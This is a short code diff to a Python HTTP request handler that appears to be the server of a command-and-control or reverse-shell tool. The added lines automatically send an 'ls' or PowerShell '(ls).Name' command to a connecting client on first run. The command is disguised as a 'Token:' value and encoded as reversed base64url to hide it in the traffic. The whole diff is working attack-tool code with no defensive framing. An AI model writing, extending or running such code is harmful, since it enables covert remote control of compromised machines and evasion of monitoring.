@@ -139,6 +139,20 @@ class MyServer(BaseHTTPRequestHandler):
                     system = "windows"
                 else:
                     system = "linux"
+    
+                if first_run:
+                    autocomplete_pending = True
+                    if system == "windows":
+                        command = "(ls).Name"
+                    else:
+                        command = "ls"
+                    
+                    encoded_command = "Token: "
+                    encoded_command += self.encode_reversed_base64url(command)
+                    self._set_headers()
+                    self.wfile.write(encoded_command.encode("utf-8"))
+                    first_run = False
+                    return first_run, command, wait_for_cmd, sudo, root, cmd_response
                 
                 if prompt != last_prompt and not autocomplete_pending and not first_run:
                     last_prompt = prompt
